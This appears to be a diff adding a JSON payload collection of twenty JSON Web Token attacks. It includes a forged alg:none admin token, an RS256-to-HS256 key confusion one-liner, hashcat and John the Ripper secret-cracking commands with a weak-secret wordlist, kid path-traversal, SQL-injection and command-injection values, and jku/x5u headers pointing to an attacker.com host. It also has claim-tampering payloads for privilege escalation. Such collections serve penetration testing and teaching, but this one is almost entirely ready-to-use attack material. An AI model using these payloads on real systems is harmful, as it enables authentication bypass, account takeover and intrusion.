@@ -1,0 +1,37 @@
+{
+  "meta": {
+    "name": "JWT Attacks",
+    "icon": "🔑",
+    "description": "JSON Web Token attack payloads and techniques. Covers algorithm confusion (alg:none, RS→HS), weak secret exploitation, kid injection, header parameter abuse, and claim tampering.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 20
+  },
+  "payloads": [
+    {"id":1,"code":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.","description":"alg:none JWT with admin role — base64(header)+'.'+base64(payload)+'.' (empty sig). Header: {alg:none}","category":"alg-none","platform":["any"],"tags":["alg-none","no-signature","admin","privilege-escalation"]},
+    {"id":2,"code":"{\"alg\":\"none\",\"typ\":\"JWT\"}","description":"JWT header with alg:none — disables signature verification in vulnerable libraries","category":"alg-none","platform":["any"],"tags":["alg-none","header","bypass"]},
+    {"id":3,"code":"{\"alg\":\"NONE\",\"typ\":\"JWT\"}","description":"Uppercase NONE variant — some parsers are case-sensitive in their alg:none check","category":"alg-none","platform":["any"],"tags":["alg-none","case","bypass"]},
+    {"id":4,"code":"{\"alg\":\"nOnE\",\"typ\":\"JWT\"}","description":"Mixed-case nOnE — evades case-sensitive alg:none blacklist","category":"alg-none","platform":["any"],"tags":["alg-none","mixed-case","bypass"]},
+
+    {"id":5,"code":"{\"alg\":\"HS256\",\"typ\":\"JWT\"}","description":"Switch RS256→HS256 — use server's public key as HMAC secret for signature confusion attack","category":"alg-confusion","platform":["any"],"tags":["alg-confusion","hs256","rs256","public-key"]},
+    {"id":6,"code":"python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, open('public.pem').read(), algorithm='HS256'))\"","description":"Python HS256 signed with RSA public key — exploits RS256→HS256 algorithm confusion","category":"alg-confusion","platform":["any"],"tags":["alg-confusion","python","rs256","hs256","rsa"]},
+    {"id":7,"code":"{\"alg\":\"ES256\",\"typ\":\"JWT\"}","description":"ECDSA ES256 variant for algorithm confusion — rare but exists in some libraries","category":"alg-confusion","platform":["any"],"tags":["alg-confusion","es256","ecdsa"]},
+
+    {"id":8,"code":"hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt","description":"Brute-force HS256 JWT secret with hashcat — mode 16500 is jwt","category":"weak-secret","platform":["any"],"tags":["weak-secret","hashcat","bruteforce","hs256"]},
+    {"id":9,"code":"john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 token.txt","description":"JohnTheRipper JWT crack — alternative to hashcat for HS256 secrets","category":"weak-secret","platform":["any"],"tags":["weak-secret","john","bruteforce","hs256"]},
+    {"id":10,"code":"secret\nsecret123\nyoursecret\nchangeme\njwtsecret\nsupersecret","description":"Common JWT weak secrets wordlist — try these first before running rockyou","category":"weak-secret","platform":["any"],"tags":["weak-secret","wordlist","common-passwords"]},
+
+    {"id":11,"code":"{\"kid\":\"../../dev/null\",\"alg\":\"HS256\"}","description":"kid path traversal to /dev/null — signs JWT with empty string key (null device returns nothing)","category":"kid-injection","platform":["linux"],"tags":["kid","path-traversal","null","bypass"]},
+    {"id":12,"code":"{\"kid\":\"../../proc/sys/kernel/randomize_va_space\",\"alg\":\"HS256\"}","description":"kid traversal to predictable file — sign with known file content as HMAC key","category":"kid-injection","platform":["linux"],"tags":["kid","path-traversal","predictable"]},
+    {"id":13,"code":"{\"kid\":\"x' UNION SELECT 'mysecret'--\",\"alg\":\"HS256\"}","description":"kid SQL injection — if kid is used in a DB lookup, inject custom key value","category":"kid-injection","platform":["any"],"tags":["kid","sqli","union","bypass"]},
+    {"id":14,"code":"{\"kid\":\"; echo mysecret\",\"alg\":\"HS256\"}","description":"kid command injection — if kid is used in shell command, inject custom secret","category":"kid-injection","platform":["linux"],"tags":["kid","cmdi","rce"]},
+
+    {"id":15,"code":"{\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_N\",\"e\":\"AQAB\"},\"alg\":\"RS256\",\"typ\":\"JWT\"}","description":"JWK header injection — embeds attacker's own public key in header for self-signed JWT","category":"header-injection","platform":["any"],"tags":["jwk","header-injection","self-signed","rsa"]},
+    {"id":16,"code":"{\"jku\":\"https://attacker.com/jwks.json\",\"alg\":\"RS256\",\"typ\":\"JWT\"}","description":"jku header injection — points to attacker-hosted JWKS file for key verification","category":"header-injection","platform":["any"],"tags":["jku","header-injection","jwks","ssrf"]},
+    {"id":17,"code":"{\"x5u\":\"https://attacker.com/cert.pem\",\"alg\":\"RS256\",\"typ\":\"JWT\"}","description":"x5u header injection — points to attacker certificate for X.509 chain validation bypass","category":"header-injection","platform":["any"],"tags":["x5u","header-injection","certificate"]},
+
+    {"id":18,"code":"{\"sub\":\"admin\",\"role\":\"superadmin\",\"iat\":1516239022,\"exp\":9999999999}","description":"Claim tampering — escalate role to superadmin and extend expiry","category":"claim-tampering","platform":["any"],"tags":["claim","privilege-escalation","exp","role"]},
+    {"id":19,"code":"{\"sub\":\"1\",\"iat\":1,\"exp\":9999999999,\"admin\":true}","description":"Admin flag injection — add admin:true claim with far-future expiry","category":"claim-tampering","platform":["any"],"tags":["claim","admin","exp","bypass"]},
+    {"id":20,"code":"{\"sub\":\"../../admin\",\"iat\":1516239022}","description":"Path traversal in sub claim — exploits systems using sub as file path or DB key","category":"claim-tampering","platform":["any"],"tags":["claim","path-traversal","sub"]}
+  ]
+}
